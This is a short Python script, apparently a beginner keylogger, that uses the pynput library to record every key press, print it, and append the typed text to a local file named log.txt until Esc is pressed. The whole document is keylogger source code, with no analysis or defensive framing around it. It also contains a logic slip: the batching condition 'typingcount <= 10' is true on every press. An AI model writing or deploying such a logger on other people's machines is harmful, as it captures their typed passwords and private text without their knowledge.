import pynput
from pynput.keyboard import Key, Listener
keys = []
typingcount = 0
def on_press(key):
    global keys, typingcount
    keys.append(key)
    typingcount += 1
    if(typingcount <= 10):
        typingcount = 0
        write_file(keys)
        keys = []
    print(key)

def on_release(key):
    if key == Key.esc:
        return False

def write_file(keys):
    with open("log.txt", "a") as f:
        for key in keys:
            k = str(key).replace("'", "")
            if(k.find("space") > 0):
                f.write(" ")
            elif k.find("Key") == -1:
                f.write(k)
            elif k.find("enter") > 0:
                f.write("\n")

with Listener(on_press= on_press, on_release = on_release) as listener:
    listener.join()

print(keys)
